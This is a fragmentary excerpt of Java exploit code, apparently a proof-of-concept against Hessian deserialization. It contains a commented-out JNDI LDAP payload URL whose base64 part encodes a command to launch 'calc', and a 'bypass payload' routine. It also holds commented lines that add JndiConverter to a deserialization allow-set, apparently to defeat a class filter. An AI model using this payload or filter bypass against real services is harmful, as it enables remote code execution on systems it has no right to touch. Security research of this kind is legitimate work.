...
//        getBeanPayload(out, "ldap://127.0.0.1:8072/wNfSybNGMm/Plain/Exec/eyJjbWQiOiJjYWxjIn0=");
    ...
    private static void getBypassPayload(Hessian2ObjectOutput out) throws Exception {
...
//        allowSet.add("org.apache.xbean.propertyeditor.JndiConverter".toLowerCase());
//        instanceMap.put("CLASS_DESERIALIZE_ALLOWED_SET", allowSet);
